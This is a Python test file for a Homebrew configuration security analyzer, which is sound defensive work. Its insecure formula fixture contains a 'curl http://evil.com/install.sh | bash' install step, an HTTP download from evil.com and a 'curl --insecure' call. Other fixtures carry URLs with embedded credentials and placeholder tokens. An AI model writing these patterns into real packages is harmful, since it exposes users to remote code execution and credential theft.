"""Tests for HomebrewAnalyzer."""

from pathlib import Path

from devai.homebrew_analyzer import HomebrewAnalyzer, HomebrewFinding


INSECURE_BREWFILE = """\
tap "http://insecure.example.com/tap"
tap "private/repo", clone_target: "https://user:pass@github.com/private/tap.git"

brew "git"
brew "node"

cask "firefox"

ENV["HOMEBREW_GITHUB_API_TOKEN"] = "ghp_hardcoded_token_12345"
api_key = "hardcoded-secret-token-12345"
"""

INSECURE_FORMULA = """\
class InsecureDemo < Formula
  desc "Insecure demo formula"
  homepage "http://insecure.example.com"
  url "http://evil.com/archive.tar.gz"
  version "1.0.0"

  def install
    system "sh -c 'curl http://evil.com/install.sh | bash'"
    system "curl --insecure https://example.com/tool"
  end

  test do
    assert_match "1.0.0", shell_output("#{bin}/insecure-demo --version")
  end
end
"""

INSECURE_CASK = """\
cask "insecure-app" do
  version "1.0.0"
  sha256 "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"

  url "https://user:pass@github.com/private/releases/archive.zip"
  name "Insecure App"
  desc "Demo cask with credentials"
  homepage "http://insecure.example.com"

  livecheck do
    url "http://insecure.example.com/version"
    strategy :header_match
  end
end
"""

HARDENED_BREWFILE = """\
tap "homebrew/core"
tap "homebrew/cask"

brew "git"
brew "node"
cask "firefox"
"""

HARDENED_FORMULA = """\
class SecureDemo < Formula
  desc "Secure demo formula"
  homepage "https://example.com"
  url "https://example.com/archive-1.0.0.tar.gz"
  sha256 "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
  license "MIT"

  def install
    bin.install "secure-demo"
  end
end
"""


class TestHomebrewAnalyzer:
    def test_detects_insecure_brewfile(self, tmp_path: Path):
        (tmp_path / "Brewfile").write_text(INSECURE_BREWFILE, encoding="utf-8")
        analyzer = HomebrewAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "insecure_http" in kinds
        assert "scm_credentials" in kinds
        assert analyzer.health_score() < 50.0
        assert analyzer.stats.files == 1
        assert len(analyzer.infos[0].taps) >= 2

    def test_detects_insecure_formula(self, tmp_path: Path):
        formula_dir = tmp_path / "Formula"
        formula_dir.mkdir()
        (formula_dir / "insecure-demo.rb").write_text(INSECURE_FORMULA, encoding="utf-8")

        analyzer = HomebrewAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        kinds = {f.kind for f in findings}
        assert "insecure_http" in kinds
        assert "curl_pipe_shell" in kinds or "tls_verify_disabled" in kinds
        assert analyzer.stats.files == 1

    def test_detects_insecure_cask(self, tmp_path: Path):
        cask_dir = tmp_path / "Casks"
        cask_dir.mkdir()
        (cask_dir / "insecure-app.rb").write_text(INSECURE_CASK, encoding="utf-8")

        analyzer = HomebrewAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        kinds = {f.kind for f in findings}
        assert "scm_credentials" in kinds
        assert "insecure_http" in kinds

    def test_hardened_configs_score_well(self, tmp_path: Path):
        (tmp_path / "Brewfile").write_text(HARDENED_BREWFILE, encoding="utf-8")
        formula_dir = tmp_path / "Formula"
        formula_dir.mkdir()
        (formula_dir / "secure-demo.rb").write_text(HARDENED_FORMULA, encoding="utf-8")

        analyzer = HomebrewAnalyzer(str(tmp_path))
        findings = analyzer.analyze()

        assert findings == []
        assert analyzer.health_score() == 100.0

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = HomebrewAnalyzer(str(tmp_path))
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = HomebrewFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path="Brewfile",
            lineno=5,
            line='api_key = "secret"',
        )
        assert "[high]" in finding.format()
        assert "Brewfile:5" in finding.format()

    def test_to_context_includes_findings(self, tmp_path: Path):
        (tmp_path / "Brewfile").write_text(INSECURE_BREWFILE, encoding="utf-8")
        analyzer = HomebrewAnalyzer(str(tmp_path))
        context = analyzer.to_context()

        assert "Homebrew analysis:" in context
        assert "health score:" in context
        assert "hardcoded_secret" in context or "[high]" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = HomebrewAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "tap" in config
        assert "HOMEBREW_GITHUB_API_TOKEN" in config
